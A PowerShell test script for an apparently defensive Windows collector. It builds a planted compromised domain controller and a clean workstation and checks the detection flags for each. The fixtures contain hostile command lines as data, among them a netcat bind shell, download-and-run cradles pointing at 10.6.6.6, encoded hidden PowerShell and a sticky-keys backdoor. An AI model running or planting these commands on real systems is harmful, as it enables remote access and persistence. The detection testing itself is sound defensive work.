# =============================================================================
# Tests for SH-06 Windows collector.
#   pwsh -NoProfile -File tests/sh06.Tests.ps1
#   powershell -NoProfile -ExecutionPolicy Bypass -File tests\sh06.Tests.ps1
#
# The collector saves everything it reads under raw\ and can replay a saved
# raw folder (-FromRaw).  These tests write two raw folders by hand - one host
# full of planted red-team tricks, one clean host - in the exact formats the
# live sources write, replay them, and check the flags.  A last test runs the
# live path on whatever machine runs the tests: on Linux nothing Windows-only
# exists, so it proves a missing source thins a section and never stops the run.
# Read-only: nothing on the machine is changed.  Written in PowerShell 2.0 syntax.
# =============================================================================
$ErrorActionPreference = 'Stop'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$root = Split-Path -Parent $here
$sh06 = Join-Path (Join-Path (Join-Path $root 'roles') 'windows-ad') 'SH-06-windows-collector.ps1'
$psExe = (Get-Process -Id $PID).Path
$tmp = Join-Path ([IO.Path]::GetTempPath()) ('cctest_sh06_' + $PID)
$out = Join-Path $tmp 'out'
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
$env:CCDC_SKIP_VERIFY = '1'
$script:pass = 0; $script:fail = 0

function T-Start($t) { Write-Host "  -- $t" }
function T-Eq($got, $want, $label) {
    if ("$got" -ceq "$want") { $script:pass++ } else { $script:fail++; Write-Host "     FAIL: $label"; Write-Host "           got [$got], wanted [$want]" }
}
function T-True($cond, $label) { if ($cond) { $script:pass++ } else { $script:fail++; Write-Host "     FAIL: $label" } }
function T-Has($text, $needle, $label) { T-True ("$text".Contains($needle)) "$label (missing [$needle])" }
function T-HasNot($text, $needle, $label) { T-True (-not "$text".Contains($needle)) "$label (found [$needle])" }
function Run([string[]]$a) {
    $all = @('-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', $sh06) + @($a)
    $text = (& $psExe @all 2>&1 | Out-String)
    $dir = ''
    if ($text -match 'All results: (\S+)') { $dir = $matches[1].Trim() }
    return @{ Code = $LASTEXITCODE; Text = $text; Dir = $dir }
}
# Csv dir name header rows -> write raw\name.csv the way ConvertTo-Csv does.
function Csv($dir, $name, [string[]]$header, [object[]]$rows) {
    $lines = @(($header | ForEach-Object { '"' + $_ + '"' }) -join ',')
    foreach ($r in $rows) { $lines += ((@($r) | ForEach-Object { '"' + ([string]$_).Replace('"', '""') + '"' }) -join ',') }
    [IO.File]::WriteAllLines((Join-Path $dir ($name + '.csv')), [string[]]$lines)
}
function Txt($dir, $name, [string]$text) { [IO.File]::WriteAllText((Join-Path $dir ($name + '.txt')), $text.Replace("`r`n", "`n").Replace("`n", "`r`n")) }
# Flags dir -> flags.csv text ('' when there are none).
function Flags($dir) { $f = Join-Path $dir 'flags.csv'; if (Test-Path -LiteralPath $f) { return [IO.File]::ReadAllText($f) }; return '' }

# -----------------------------------------------------------------------------
# A host with planted problems: a domain controller.
# -----------------------------------------------------------------------------
$bad = Join-Path $tmp 'bad'; New-Item -ItemType Directory -Path $bad -Force | Out-Null
Csv $bad os @('Caption','Version','BuildNumber','ProductType','OSArchitecture','LastBootUpTime','InstallDate') @(,@('Microsoft Windows Server 2016 Standard','10.0.14393','14393','2','64-bit','20261111080000.500000-300','20240101120000.000000-300'))
Csv $bad computer @('Name','Domain','PartOfDomain','DomainRole','Manufacturer','Model','TotalPhysicalMemory') @(,@('DC01','corp.local','True','5','VMware','VMware7','4294967296'))
Csv $bad nics @('Description','MACAddress','IPAddress','Gateway','DNS','DHCPEnabled') @(,@('vmxnet3','00:50:56:aa:bb:cc','10.0.0.5 fe80::1','10.0.0.1','127.0.0.1','False'))
Txt $bad hosts @"
# Copyright (c) 1993-2009 Microsoft Corp.
127.0.0.1       localhost
10.6.6.6        update.microsoft.com windowsupdate.com
10.0.0.20       intranet.corp.local
"@
Csv $bad users @('Name','SID','Disabled','Lockout','PasswordRequired','PasswordExpires','Description') @(
    @('Administrator','S-1-5-21-1-2-3-500','False','False','True','False','Built-in account'),
    @('Guest','S-1-5-21-1-2-3-501','False','False','False','False',''),
    @('svc_backup$','S-1-5-21-1-2-3-1105','False','False','True','False',''),
    @('jsmith','S-1-5-21-1-2-3-1106','False','False','True','True','temp pwd: Summer2026!'),
    @('mark.jacobs','S-1-5-21-1-2-3-1107','False','False','True','True','')
)
Csv $bad group_members @('Group','GroupSid','Member','Class') @(
    @('Administrators','S-1-5-32-544','CORP\Administrator','User'),
    @('Administrators','S-1-5-32-544','CORP\svc_backup$','User'),
    @('Administrators','S-1-5-32-544','CORP\Domain Users','Group'),
    @('Domain Admins','S-1-5-21-1-2-3-512','CORP\jsmith','User'),
    @('Remote Desktop Users','S-1-5-32-555','CORP\mark.jacobs','User')
)
Txt $bad netstat @"

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:53             0.0.0.0:0              LISTENING       2100
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1200
  TCP    0.0.0.0:4444           0.0.0.0:0              LISTENING       3300
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       3400
  TCP    0.0.0.0:2323           0.0.0.0:0              LISTENING       3500
  TCP    10.0.0.5:49800         10.6.6.6:443           ESTABLISHED     3600
  TCP    10.0.0.5:49801         10.6.6.7:31337         ESTABLISHED     2100
  TCP    [::]:445               [::]:0                 LISTENING       4
  UDP    0.0.0.0:53             *:*                                    2100
"@
Csv $bad processes @('ProcessId','ParentProcessId','Name','ExecutablePath','CommandLine','CreationDate','Owner') @(
    @('4','0','System','','','',''),
    @('640','500','lsass.exe','C:\Windows\system32\lsass.exe','C:\Windows\system32\lsass.exe','20261111080001.000000-300','NT AUTHORITY\SYSTEM'),
    @('641','500','lsass.exe','C:\Users\Public\lsass.exe','C:\Users\Public\lsass.exe','20261111090001.000000-300','CORP\jsmith'),
    @('1200','600','svchost.exe','C:\Windows\System32\svchost.exe','C:\Windows\System32\svchost.exe -k NetworkService','20261111080001.000000-300','NT AUTHORITY\NETWORK SERVICE'),
    @('2100','600','dns.exe','C:\Windows\system32\dns.exe','C:\Windows\system32\dns.exe','20261111080001.000000-300','NT AUTHORITY\SYSTEM'),
    @('3300','3000','nc.exe','C:\Windows\Temp\nc.exe','C:\Windows\Temp\nc.exe -lvp 4444 -e cmd.exe','20261111090000.000000-300','CORP\jsmith'),
    @('3400','600','updater.exe','C:\Users\jsmith\AppData\Local\updater.exe','updater.exe','20261111090000.000000-300','CORP\jsmith'),
    @('3500','700','powershell.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe','powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA','20261111090000.000000-300','CORP\jsmith'),
    @('3600','3601','cmd.exe','C:\Windows\System32\cmd.exe','cmd.exe /c whoami','20261111090000.000000-300','IIS APPPOOL\Default'),
    @('3601','600','w3wp.exe','C:\Windows\System32\inetsrv\w3wp.exe','w3wp.exe -ap Default','20261111090000.000000-300','IIS APPPOOL\Default'),
    @('3700','600','svchost.exe','C:\ProgramData\svchost.exe','C:\ProgramData\svchost.exe','20261111090000.000000-300','NT AUTHORITY\SYSTEM')
)
Csv $bad services @('Name','DisplayName','State','StartMode','PathName','StartName','ProcessId') @(
    @('DNS','DNS Server','Running','Auto','C:\Windows\system32\dns.exe','LocalSystem','2100'),
    @('NTDS','Active Directory Domain Services','Running','Auto','C:\Windows\System32\lsass.exe','LocalSystem','640'),
    @('TermService','Remote Desktop Services','Running','Manual','C:\Windows\System32\svchost.exe -k NetworkService','NT Authority\NetworkService','1200'),
    @('Spooler','Print Spooler','Running','Auto','C:\Windows\System32\spoolsv.exe','LocalSystem','900'),
    @('RemoteRegistry','Remote Registry','Running','Auto','C:\Windows\system32\svchost.exe -k localService','NT AUTHORITY\LocalService','901'),
    @('EventLog','Windows Event Log','Stopped','Disabled','C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted','NT AUTHORITY\LocalService','0'),
    @('WinUpdSvc','Windows Update Helper','Running','Auto','cmd.exe /c powershell -nop -w hidden -c "iex(irm http://10.6.6.6/a)"','LocalSystem','3501'),
    @('Backup Agent','Backup Agent','Running','Auto','C:\Program Files\Backup Co\Agent\agent.exe -service','CORP\svc_backup$','3502'),
    @('SqlAgent','SQL Agent','Running','Auto','"C:\Program Files\SQL\agent.exe"','CORP\svc_sql','3503')
)
Csv $bad registry @('Key','Name','Value') @(
    @('HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','(key)',''),
    @('HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','VMware Tools','"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr'),
    @('HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','Updater','powershell.exe -w hidden -nop -c "iex (iwr http://10.6.6.6/p)"'),
    @('HKU\S-1-5-21-1-2-3-1106\Software\Microsoft\Windows\CurrentVersion\Run','OneDriveHelper','C:\Users\jsmith\AppData\Roaming\odh.exe'),
    @('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','Userinit','C:\Windows\system32\userinit.exe,C:\Windows\Temp\x.exe'),
    @('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','Shell','explorer.exe'),
    @('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','AutoAdminLogon','1'),
    @('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','DefaultUserName','Administrator'),
    @('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','DefaultPassword','(set; value not recorded)'),
    @('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger','C:\Windows\System32\cmd.exe'),
    @('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows','AppInit_DLLs','C:\ProgramData\hook.dll'),
    @('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows','LoadAppInit_DLLs','1'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\Lsa','Security Packages','kerberos | msv1_0 | schannel | wdigest | tspkg | pku2u | evilssp'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\Lsa','LmCompatibilityLevel','1'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\Lsa','RestrictAnonymousSAM','0'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest','UseLogonCredential','1'),
    @('HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','EnableLUA','0'),
    @('HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','LocalAccountTokenFilterPolicy','1'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','0'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','UserAuthentication','0'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters','SMB1','1'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters','RequireSecuritySignature','0'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters','FullSecureChannelProtection','0'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp','0.0.0.0/8443','10.6.6.6/443'),
    @('HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer','AlwaysInstallElevated','1'),
    @('HKU\S-1-5-21-1-2-3-1106\Software\Policies\Microsoft\Windows\Installer','AlwaysInstallElevated','1'),
    @('HKLM\SOFTWARE\Microsoft\NetSh','ifmon','ifmon.dll'),
    @('HKLM\SOFTWARE\Microsoft\NetSh','helper','C:\Windows\Temp\nethelp.dll'),
    @('HKLM\SOFTWARE\Policies\Microsoft\Windows Defender','DisableAntiSpyware','1'),
    @('HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths','C:\','0'),
    @('HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths','D:\SQLData','0'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-1}','v2.31|Action=Allow|Active=TRUE|Dir=In|Name=Allow All|'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','RemoteDesktop-UserMode-In-TCP','v2.31|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=3389|App=%SystemRoot%\system32\svchost.exe|Svc=termservice|Name=@FirewallAPI.dll,-28775|EmbedCtxt=@FirewallAPI.dll,-28752|'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-2}','v2.31|Action=Allow|Active=TRUE|Dir=In|Protocol=6|LPort=4444|App=C:\Windows\Temp\nc.exe|Name=backdoor|'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-3}','v2.31|Action=Allow|Active=TRUE|Dir=In|Name=@{Microsoft.LockApp_10.0.26100.9818_neutral__cw5n1h2txyewy?ms-resource://Microsoft.LockApp/resources/AppDisplayName}|PFN=Microsoft.LockApp_cw5n1h2txyewy|AppPkgId=S-1-15-2-1|'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-4}','v2.31|Action=Allow|Active=TRUE|Dir=In|Name=Tailscale-In|LA4=100.105.236.63|'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-5}','v2.31|Action=Allow|Active=FALSE|Dir=In|Name=Old allow all|'),
    @('HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\FirewallRules','{AAAA-6}','v2.31|Action=Allow|Active=TRUE|Dir=In|Protocol=6|App=C:\Users\jsmith\AppData\Local\Discord\Discord.exe|Name=Discord|'),
    @('HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\FirewallRules','{BBBB-1}','v2.31|Action=Allow|Active=TRUE|Dir=In|Name=GPO allow all|')
)
Csv $bad startup_files @('Path','LastWrite') @(,@('C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat','2026-11-11 09:00'))
Csv $bad wmi_consumers @('Class','Name','Command') @(,@('CommandLine','Updater','C:\Windows\System32\cmd.exe /c C:\ProgramData\u.bat'))
Csv $bad system_files @('Name','Path','Size','Sha256') @(
    @('sethc.exe','C:\Windows\System32\sethc.exe','289792','aaaa'),
    @('utilman.exe','C:\Windows\System32\utilman.exe','289792','aaaa'),
    @('osk.exe','C:\Windows\System32\osk.exe','600000','bbbb'),
    @('cmd.exe','C:\Windows\System32\cmd.exe','289792','aaaa'),
    @('powershell.exe','C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe','450000','cccc')
)
Txt $bad schtasks @"
"HostName","TaskName","Next Run Time","Status","Logon Mode","Last Run Time","Last Result","Author","Task To Run","Start In","Comment","Scheduled Task State","Idle Time","Power Management","Run As User","Delete Task If Not Rescheduled","Stop Task If Runs X Hours and X Mins","Schedule","Schedule Type","Start Time","Start Date","End Date","Days","Months","Repeat: Every","Repeat: Until: Time","Repeat: Until: Duration","Repeat: Stop If Still Running"
"DC01","\GoogleUpdateTaskMachineCore","11/12/2026 9:00:00 AM","Ready","Interactive/Background","N/A","1","Google","C:\Program Files (x86)\Google\Update\GoogleUpdate.exe /c","N/A","N/A","Enabled","Disabled","","SYSTEM","Disabled","72:00:00","Scheduling data is not available in this format.","Daily","9:00:00 AM","1/1/2026","N/A","Every 1 day(s)","N/A","Disabled","Disabled","Disabled","Disabled"
"DC01","\SysHealth","11/12/2026 9:05:00 AM","Ready","Interactive/Background","N/A","1","CORP\jsmith","powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA","N/A","N/A","Enabled","Disabled","","SYSTEM","Disabled","72:00:00","Scheduling data is not available in this format.","Daily","9:00:00 AM","1/1/2026","N/A","Every 1 day(s)","N/A","Disabled","Disabled","Disabled","Disabled"
"HostName","TaskName","Next Run Time","Status","Logon Mode","Last Run Time","Last Result","Author","Task To Run","Start In","Comment","Scheduled Task State","Idle Time","Power Management","Run As User","Delete Task If Not Rescheduled","Stop Task If Runs X Hours and X Mins","Schedule","Schedule Type","Start Time","Start Date","End Date","Days","Months","Repeat: Every","Repeat: Until: Time","Repeat: Until: Duration","Repeat: Stop If Still Running"
"DC01","\Microsoft\Windows\Defrag\ScheduledDefrag","N/A","Ready","Interactive/Background","N/A","1","Microsoft","%windir%\system32\defrag.exe -c -h -o -$","N/A","N/A","Enabled","Disabled","","SYSTEM","Disabled","72:00:00","Scheduling data is not available in this format.","Weekly","1:00:00 AM","1/1/2026","N/A","SUN","N/A","Disabled","Disabled","Disabled","Disabled"
"DC01","\Cleanup","N/A","Ready","Interactive/Background","N/A","1","CORP\jsmith","C:\Users\Public\clean.exe","N/A","N/A","Enabled","Disabled","","SYSTEM","Disabled","72:00:00","Scheduling data is not available in this format.","Daily","9:00:00 AM","1/1/2026","N/A","Every 1 day(s)","N/A","Disabled","Disabled","Disabled","Disabled"
"@
Txt $bad auditpol @"
System audit policy
Category/Subcategory                      Setting
System
  Security System Extension               No Auditing
  System Integrity                        No Auditing
Logon/Logoff
  Logon                                   No Auditing
  Logoff                                  No Auditing
"@
Txt $bad fw_profiles @"

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound

Private Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       AllowInbound,AllowOutbound

Public Profile Settings:
----------------------------------------------------------------------
State                                 ON
Firewall Policy                       BlockInbound,AllowOutbound
Ok.
"@
Csv $bad defender_status @('AMServiceEnabled','AntivirusEnabled','RealTimeProtectionEnabled','BehaviorMonitorEnabled','IsTamperProtected','AntivirusSignatureLastUpdated') @(,@('True','True','False','True','False','11/10/2026 3:00:00 AM'))
Csv $bad defender_prefs @('DisableRealtimeMonitoring','ExclusionPath','ExclusionProcess','ExclusionExtension') @(,@('True','C:\|D:\SQLData','','ps1'))
Csv $bad shares @('Name','Path','Type','Description') @(
    @('ADMIN$','C:\Windows','2147483648','Remote Admin'),
    @('NETLOGON','C:\Windows\SYSVOL\sysvol\corp.local\SCRIPTS','0','Logon server share'),
    @('Public','C:\Public','0','')
)
Csv $bad share_acl @('Share','Trustee','Access') @(@('Public','\Everyone','Full'), @('NETLOGON','\Everyone','Read'))
Csv $bad software @('DisplayName','DisplayVersion','Publisher','InstallDate') @(@('VMware Tools','12.1','VMware','20240101'), @('AnyDesk','8.0','AnyDesk Software GmbH','20261111'))
Csv $bad hotfixes @('HotFixID','Description','InstalledOn','InstalledBy') @(@('KB4512517','Security Update','8/13/2019','NT AUTHORITY\SYSTEM'), @('KB4520010','Update','5/20/2020',''))
Csv $bad events @('Time','Log','Id','Detail') @(
    @('2026-11-11 09:10:00','Security','1102','Account Name=jsmith'),
    @('2026-11-11 09:00:00','Security','4720','Account Name=jsmith; Account Name=svc_backup$'),
    @('2026-11-11 09:01:00','Security','4732','Account Name=jsmith; Group Name=Administrators'),
    @('2026-11-11 09:02:00','System','7045','Service Name=WinUpdSvc; Service File Name=cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'),
    @('2026-11-11 09:03:00','System','7045','Service Name=MpKslDrv; Service File Name=C:\ProgramData\Microsoft\Windows Defender\Definition Updates\x\MpKslDrv.sys')
)
Csv $bad drivers @('Name','DisplayName','State','StartMode','PathName') @(
    @('disk','Disk Driver','Running','Boot','C:\Windows\system32\drivers\disk.sys'),
    @('evil','evil','Running','System','C:\Users\Public\evil.sys')
)
Txt $bad user_rights @"
[Unicode]
Unicode=yes
[Privilege Rights]
SeDebugPrivilege = *S-1-5-32-544,*S-1-5-21-1-2-3-1106
SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
SeRemoteInteractiveLogonRight = *S-1-5-32-544,*S-1-1-0
"@
Csv $bad features @('ID','Name') @(@('10','Active Directory Domain Services'), @('13','DNS Server'))

# -----------------------------------------------------------------------------
# A clean workstation.
# -----------------------------------------------------------------------------
$good = Join-Path $tmp 'good'; New-Item -ItemType Directory -Path $good -Force | Out-Null
Csv $good os @('Caption','Version','BuildNumber','ProductType','OSArchitecture','LastBootUpTime','InstallDate') @(,@('Microsoft Windows 10 Pro','10.0.19045','19045','1','64-bit','20261111080000.500000-300','20240101120000.000000-300'))
Csv $good computer @('Name','Domain','PartOfDomain','DomainRole','Manufacturer','Model','TotalPhysicalMemory') @(,@('WS01','WORKGROUP','False','0','VMware','VMware7','4294967296'))
Txt $good hosts "# comments only`r`n#127.0.0.1 localhost`r`n"
Csv $good users @('Name','SID','Disabled','Lockout','PasswordRequired','PasswordExpires','Description') @(
    @('Administrator','S-1-5-21-9-9-9-500','True','False','True','False','Built-in account'),
    @('Guest','S-1-5-21-9-9-9-501','True','False','False','False',''),
    @('alice','S-1-5-21-9-9-9-1001','False','False','True','True','')
)
Txt $good netstat @"
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:5939         0.0.0.0:0              LISTENING       950
  TCP    10.0.0.50:50000        10.0.0.5:445           ESTABLISHED     4
"@
Csv $good processes @('ProcessId','ParentProcessId','Name','ExecutablePath','CommandLine','CreationDate','Owner') @(
    @('900','600','svchost.exe','C:\WINDOWS\system32\svchost.exe','C:\WINDOWS\system32\svchost.exe -k RPCSS -p','20261111080001.000000-300','NT AUTHORITY\NETWORK SERVICE'),
    @('700','600','lsass.exe','C:\WINDOWS\system32\lsass.exe','C:\WINDOWS\system32\lsass.exe','20261111080001.000000-300','NT AUTHORITY\SYSTEM'),
    @('1500','1400','explorer.exe','C:\WINDOWS\Explorer.EXE','C:\WINDOWS\Explorer.EXE','20261111080101.000000-300','WS01\alice')
)
Csv $good services @('Name','DisplayName','State','StartMode','PathName','StartName','ProcessId') @(
    @('RpcSs','Remote Procedure Call (RPC)','Running','Auto','C:\WINDOWS\system32\svchost.exe -k rpcss -p','NT AUTHORITY\NetworkService','900'),
    @('EventLog','Windows Event Log','Running','Auto','C:\WINDOWS\System32\svchost.exe -k LocalServiceNetworkRestricted -p','NT AUTHORITY\LocalService','901'),
    @('WinDefend','Microsoft Defender Antivirus Service','Running','Auto','"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.24090.11-0\MsMpEng.exe"','LocalSystem','902')
)
Csv $good registry @('Key','Name','Value') @(
    @('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','Userinit','C:\WINDOWS\system32\userinit.exe,'),
    @('HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon','Shell','explorer.exe'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\Lsa','Security Packages','""'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\Lsa','Authentication Packages','msv1_0'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\Lsa','Notification Packages','scecli'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\Session Manager','BootExecute','autocheck autochk *'),
    @('HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','EnableLUA','1'),
    @('HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','1'),
    @('HKLM\SOFTWARE\Microsoft\NetSh','ifmon','ifmon.dll'),
    @('HKLM\SOFTWARE\Microsoft\NetSh','wlancfg','WLANCFG.DLL')
)
Csv $good smb_server @('EnableSMB1Protocol','RequireSecuritySignature','EncryptData') @(,@('False','False','False'))
Txt $good fw_profiles "Domain Profile Settings:`r`n---`r`nState                                 ON`r`nFirewall Policy                       BlockInbound,AllowOutbound`r`n`r`nPrivate Profile Settings:`r`n---`r`nState                                 ON`r`nFirewall Policy                       BlockInbound,AllowOutbound`r`n`r`nPublic Profile Settings:`r`n---`r`nState                                 ON`r`nFirewall Policy                       BlockInbound,AllowOutbound`r`nOk.`r`n"
Csv $good defender_status @('AMServiceEnabled','AntivirusEnabled','RealTimeProtectionEnabled','BehaviorMonitorEnabled','IsTamperProtected','AntivirusSignatureLastUpdated') @(,@('True','True','True','True','True','11/11/2026 3:00:00 AM'))
Csv $good defender_prefs @('DisableRealtimeMonitoring','ExclusionPath','ExclusionProcess','ExclusionExtension') @(,@('False','','',''))
$recent = (Get-Date).AddDays(-20).ToString('M/d/yyyy', [Globalization.CultureInfo]::InvariantCulture)
Csv $good hotfixes @('HotFixID','Description','InstalledOn','InstalledBy') @(,@('KB5040427','Security Update',$recent,'NT AUTHORITY\SYSTEM'))
Csv $good shares @('Name','Path','Type','Description') @(@('ADMIN$','C:\WINDOWS','2147483648','Remote Admin'), @('C$','C:\','2147483648','Default share'), @('IPC$','','2147483651','Remote IPC'))

# -----------------------------------------------------------------------------
T-Start 'options'
$r = Run @('-List'); T-Eq $r.Code 0 '-List exits 0'; T-Has $r.Text 'autostart' '-List names the sections'
$r = Run @('-Out', $out, '-Profile', 'huge'); T-Eq $r.Code 2 'an unknown profile exits 2'
$r = Run @('-Out', $out, '-Only', 'users,nosuch'); T-Eq $r.Code 2 'an unknown section exits 2'
$r = Run @('-Out', $out, '-FromRaw', (Join-Path $tmp 'missing')); T-Eq $r.Code 2 'a missing -FromRaw folder exits 2'

T-Start 'replay of a host full of planted problems'
$r = Run @('-Out', $out, '-FromRaw', $bad)
T-Eq $r.Code 0 'exits 0'
T-Has $r.Text 'READ-ONLY' 'says it changes nothing'
$fl = Flags $r.Dir
$sum = ''; if ($r.Dir) { $sum = [IO.File]::ReadAllText((Join-Path $r.Dir 'summary.txt')) }
T-Has $sum 'DC01  Microsoft Windows Server 2016 Standard (build 14393)  domain controller  domain corp.local' 'summary: host line'
T-Has $sum 'Administrators: Administrator, svc_backup$, Domain Users, jsmith' 'summary: who is an admin'
T-Has $sum 'Listening TCP' 'summary: listening ports'
# system
T-Has $fl '"HIGH","system","hosts: update.microsoft.com windowsupdate.com"' 'hosts file redirecting Microsoft update is HIGH'
T-Has $fl '"MED","system","hosts: intranet.corp.local"' 'other hosts entries are MED'
# users
T-Has $fl '"HIGH","users","Guest","the Guest account is enabled"' 'Guest enabled'
T-Has $fl '"HIGH","users","svc_backup$"' 'hidden $ account'
T-Has $fl 'description field looks like it holds a password' 'password in a description'
T-HasNot $fl 'Summer2026' 'the password from the description is not copied into flags'
T-Has $fl '"HIGH","users","CORP\Domain Users"' 'Domain Users in Administrators is HIGH'
T-Has $fl '"LOW","users","CORP\mark.jacobs","member of Remote Desktop Users"' 'RDP users listed'
# ports and connections
T-Has $fl '"HIGH","ports","4444/tcp nc.exe"' 'nc listening'
T-Has $fl '"MED","ports","8080/tcp updater.exe","listening program runs from an unusual folder' 'listener from AppData is MED (desktop apps live there)'
T-Has $fl '"HIGH","ports","2323/tcp powershell.exe"' 'powershell listening'
T-HasNot $fl '"ports","445/tcp System"' 'normal SMB listener not flagged'
T-Has $fl '"HIGH","connections","cmd.exe -> 10.6.6.6:443"' 'cmd.exe with a live connection'
T-Has $fl '"HIGH","connections","dns.exe -> 10.6.6.7:31337","connection to common backdoor port 31337"' 'connection to a backdoor port'
# services
T-Has $fl '"HIGH","services","WinUpdSvc","service runs a command line' 'service running a command line'
T-Has $fl '"MED","services","Backup Agent","unquoted service path with spaces' 'unquoted path'
T-HasNot $fl '"services","SqlAgent","unquoted' 'a quoted path is not flagged'
T-Has $fl '"LOW","services","SqlAgent","runs as the account CORP\svc_sql' 'service account noted for password changes'
T-Has $fl '"MED","services","RemoteRegistry"' 'Remote Registry running'
T-Has $fl '"MED","services","Spooler","Print Spooler runs on a domain controller' 'Spooler on a DC'
T-Has $fl '"HIGH","services","EventLog","Windows Event Log is Stopped"' 'event log stopped'
# autostart
T-Has $fl '"HIGH","autostart","Updater","Run key starts a suspicious command' 'Run key with a download cradle'
T-Has $fl '"LOW","autostart","VMware Tools"' 'normal Run key is LOW'
T-Has $fl '"MED","autostart","OneDriveHelper"' 'user Run key from AppData is MED'
T-Has $fl '"HIGH","autostart","Winlogon Userinit"' 'Userinit with an extra program'
T-HasNot $fl '"Winlogon Shell"' 'normal Shell not flagged'
T-Has $fl '"HIGH","autostart","sethc.exe","debugger set' 'sticky-keys debugger'
T-Has $fl '"HIGH","autostart","AppInit_DLLs"' 'AppInit DLL loaded'
T-Has $fl 'unknown package loaded into lsass: evilssp' 'unknown LSA package'
T-HasNot $fl 'into lsass: wdigest' 'default LSA packages not flagged'
T-Has $fl '"MED","autostart","helper","unknown netsh helper DLL' 'unknown netsh helper'
T-HasNot $fl '"ifmon"' 'default netsh helper not flagged'
T-Has $fl '"MED","autostart","run.bat"' 'startup folder file'
T-Has $fl '"HIGH","autostart","WMI Updater"' 'WMI subscription'
T-Has $fl '"HIGH","autostart","utilman.exe","C:\Windows\System32\utilman.exe has been replaced by cmd.exe' 'utilman replaced by cmd'
T-HasNot $fl '"osk.exe"' 'unchanged accessibility program not flagged'
# tasks
T-Has $fl '"HIGH","tasks","\SysHealth","task runs a suspicious command' 'encoded PowerShell task'
T-Has $fl '"HIGH","tasks","\Cleanup","task runs a program from an unusual folder' 'task from Users\Public'
T-Has $fl '"LOW","tasks","\GoogleUpdateTaskMachineCore"' 'third-party task is LOW'
T-HasNot $fl 'ScheduledDefrag' 'Microsoft task not flagged'
T-HasNot $fl '"TaskName"' 'repeated header lines are not tasks'
